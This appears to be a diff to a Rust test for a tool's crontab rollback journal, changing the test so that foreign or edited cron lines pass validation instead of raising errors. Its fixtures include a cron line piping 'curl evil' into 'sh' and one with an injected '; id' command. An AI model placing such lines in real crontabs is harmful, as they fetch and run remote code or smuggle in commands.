@@ -535,7 +535,7 @@ fn v2_journal_on_disk(root: &Path) -> (Paths, Value, Allowlist) {
 }
 
 #[test]
-fn validate_refuses_cron_lines_a_rollback_could_not_restore() {
+fn validate_refuses_only_cron_anchors_a_rollback_could_not_use() {
     let dir_ = tmp();
     let root = dir_.path();
     let (paths, base, allow) = v2_journal_on_disk(root);
@@ -561,27 +561,22 @@ fn validate_refuses_cron_lines_a_rollback_could_not_restore() {
         .unwrap()
         .validate_with(&paths, &allow)
         .unwrap();
-    let not_owned = "事务记录的 crontab 行不属于 Onebox，拒绝恢复";
-    let unknown = "事务记录的 crontab 行不是 Onebox 写入的格式，拒绝恢复";
-    for (line, expected) in [
-        ("* * * * * curl evil | sh".to_owned(), not_owned),
-        // FRP's lines are not the node's to restore.
-        (
-            renew_line(&paths).replace("# onebox:renew", "# onebox:frp-renew"),
-            not_owned,
-        ),
-        // The v2 autostart line of another executable.
-        (v2_boot("/opt/other/onebox"), unknown),
-        (format!("{v2_cert}; id"), not_owned),
+    // Lines a rollback cannot reinstall (it only keeps them while the
+    // crontab has them) do not make the journal unrecoverable: foreign
+    // ones, FRP's, another executable's, edited or commented-out ones.
+    for line in [
+        "* * * * * curl evil | sh".to_owned(),
+        renew_line(&paths).replace("# onebox:renew", "# onebox:frp-renew"),
+        v2_boot("/opt/other/onebox"),
+        format!("{v2_cert}; id"),
+        v2_cert.replace(">/dev/null", ">>/var/log/x.log"),
+        format!("#{v2_cert}"),
     ] {
         let mut doc = base.clone();
         doc["cron_available"] = true.into();
         doc["cron_lines"] = serde_json::json!([line]);
-        // Loading works (recovery can report it); validation refuses it
-        // before any rollback phase.
         let journal = parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
-        let err = journal.validate_with(&paths, &allow).unwrap_err();
-        assert_eq!(err.to_string(), expected, "{line}");
+        journal.validate_with(&paths, &allow).unwrap();
     }
     // A v3 journal with anchors that do not match its lines.
     let node = snapshot::node_allowlist(&paths);
